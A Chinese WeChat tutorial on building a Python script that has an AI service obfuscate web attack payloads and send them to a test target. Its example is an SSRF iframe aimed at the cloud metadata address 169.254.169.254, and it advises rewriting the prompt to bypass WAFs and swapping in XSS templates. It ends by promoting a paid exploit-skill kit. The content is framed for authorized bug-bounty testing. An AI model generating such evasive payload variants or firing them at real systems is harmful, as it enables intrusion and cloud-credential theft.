---
title: 手把手教你写一套AI挖洞探测脚本｜新手别再只会复制别人的源码
url: https://mp.weixin.qq.com/s/AJlYG_pSMDpKBksbGizFOQ
source: Doonsec's feed
date: 2026-11-18
fetch_date: 2026-11-19T09:39:56.104493
---

# 手把手教你写一套AI挖洞探测脚本｜新手别再只会复制别人的源码

# 手把手教你写一套AI挖洞探测脚本｜新手别再只会复制别人的源码

原创

网安学习室
网安学习室

网络安全学习室

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

> 摘要：很多人想要AI挖洞脚本，但拿过来根本不会改。今天拆开完整步骤，看懂原理。整套可直接跑的WorkBuddy+Skill配置模板，文末找我领取。

## 01 先搞懂：我们要写的脚本能干什么

它不是一键挖洞神器，就3件事：

1. 接收原始Payload，调用Skill模型自动生成多种变形（编码、标签拆分、混淆）
2. 按可控间隔依次发包，避免短时间大量请求被封IP
3. 收集响应包，标记差异，把可疑结果输出给人复核

不会自动判定漏洞、不会遍历全站、不会盲扫域名。

## 02 环境准备（第一步）

需要的工具：

* Python3 环境
* requests库（发包）
* 你的Skill/WorkBuddy调用密钥（核心，用来生成变体payload）
* Burp（可选，用来对照抓包，验证请求）

安装依赖命令：

```
pip install requests
```

> 提醒：密钥不要直接发到公众号、评论区，密钥泄露别人会消耗你的额度。这也是为什么我不会直接把全套配置公开。

## 03 脚本整体逻辑拆解（4大模块）

1. 模型调用模块：传给Skill原始payload，返回一批变形后的payload
2. 请求发包模块：循环发送，设置延时，携带请求头，模拟正常访问
3. 结果对比模块：记录响应状态码、响应长度、关键词匹配
4. 输出模块：把可疑结果打印保存，方便人工去Burp复测

## 04 基础可运行示例代码（脱敏简化版）

```
import requests
import time

# --------------------------配置区（需要自己填）--------------------------
API_KEY = "你的skill密钥"
API_URL = "skill调用地址"
TARGET_URL = "授权测试的靶场接口地址"
ORIGIN_PAYLOAD = '<iframe src="http://169.254.169.254/latest/meta-data">'
DELAY = 1.5  # 发包间隔，防止WAF封IP
# ----------------------------------------------------------------------

def get_payload_variants(origin):
    """调用AI生成payload变体"""
    prompt = f"""对下面payload做变形，保留SSRF触发能力，使用html实体编码、换行拆分、标签混淆，不要生成无效payload，直接返回列表：
{origin}
"""
    data = {"prompt": prompt}
    resp = requests.post(API_URL, json=data)
    # 这里简化，实际需要做json解析，处理模型返回
    variant_list = resp.json().get("result", [origin])
    return variant_list

def send_test(target, payload):
    headers = {
        "User-Agent": "Mozilla/5.0"
    }
    data = {"content": payload}
    try:
        r = requests.post(target, data=data, headers=headers, timeout=8)
        return {
            "payload": payload,
            "status_code": r.status_code,
            "length": len(r.text),
            "text": r.text[:300]
        }
    except Exception as e:
        return {"payload": payload, "error": str(e)}

if __name__ == "__main__":
    print("===== AI payload变体探测启动 =====")
    payloads = get_payload_variants(ORIGIN_PAYLOAD)
    for p in payloads:
        res = send_test(TARGET_URL, p)
        print(f"【测试payload】{p[:80]}...")
        print(f"返回结果：{res}\n")
        time.sleep(DELAY)
    print("探测完成，人工核对返回内容，确认是否存在SSRF")
```

## 05 手把手改代码，适配你的场景（重点教学部分）

1. 改接口：GET接口和POST接口传参方式不一样，GET要拼在url后面
2. 改请求头：很多业务要cookie、token，没有身份Cookie根本进不去接口
3. 修改提示词：想绕WAF，就调整prompt，让AI换混淆方式；测试XSS就换payload模板
4. 增加筛选规则：你可以加代码，识别返回包里面的特征关键词，标记可疑条目

> 这里就是门槛：**每个厂商的接口、鉴权、WAF规则全都不一样。一份模板不能通吃所有站点。**很多粉丝拿到代码，只会直接运行，不会改Cookie、不会改传参方式，最后跑不出结果，以为脚本没用。

## 06 新手最容易踩的4个大坑

1. 密钥直接写死在代码里往外发，额度被别人刷光
2. 延时设置为0，疯狂发包，直接触发WAF拉黑IP，甚至被厂商风控记录
3. 拿到脚本就去扫网上随便找的网站，没有授权，违规
4. 脚本输出异常就直接提交漏洞，不人工复核，大量误报，SRC被打回、降低账号评级

## 07 实话：完整能用的版本，比这个麻烦很多

上面这份只是教学骨架。

真正我日常在用的完整版，额外包含：

* 自动去重payload
* 代理对接Burp，所有请求同步抓包
* 结果保存到本地csv，方便复盘
* 异常重试机制、失败自动标记
* 多payload策略池（SSRF、XSS分开模板）
* 日志分级输出，过滤无效噪音

整套配置、Skill的最优提示词模板、Burp联动配置，参数调试细节，全部放出来篇幅太长，而且新手容易乱改造成风险。

## 08 **Web 漏洞技能集**

如果不想从零一行一行调试，想要**整套调试好的成品脚本、配套提示词模板、详细配置文档**，可以直接来找我。

---

本次全套干货已打包：**AI 自动化挖洞 Skill，也就是这套《Web 漏洞技能集》**。这套技能库一共整理了 40 个 Skill，从前期的信息收集、资产分析，到中间的漏洞排查，再到最后的漏洞报告生成，整个挖洞流程都已经拆分好了。

后面实际测试的时候，只需要根据当前目标的情况，选择对应的 Skill，让 AI 按照对应流程执行即可，新手也可以快速上手，直接👀👉[全套自学资料](https://mp.weixin.qq.com/s?__biz=MzkzNzk5MjEyNg==&mid=2247483826&idx=1&sn=4ff03198e63ca6e68161a5b93eee17da&scene=21#wechat_redirect)

![图片](https://mmbiz.qpic.cn/mmbiz_png/Vs6KsYlvMyOrNbAqASTMTgmkCbjgRzEEuSAfuEFqTSibtAicHicoMnyvZibhcKAcEia3YicRjNgibToXrtkn8oBjM9iaPxCWrEAA7UQ67VaoAKhQZfI/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=1)

⚠️ 合规声明 本文所有技术内容仅用于官方授权 SRC 合规测试与网络安全技术学习，严禁未授权探测、非法渗透测试，违规操作自行承担法律责任。

#网络安全 #SRC挖洞 #AI自动化挖洞 #Hermes #业务逻辑漏洞 #优惠券越权漏洞 #网安副业 #零基础挖洞

预览时标签不可点

阅读原文

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/iaLzURuoralYfTVkr1yhiasbN03K2QuRu04rw6cCa7lx8kbE5uGoeTArEW3nCoRN0Y8dQDQjrCtTycTCjUxGmicvw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
推荐
，轻点两下取消推荐
分享
留言
收藏
听过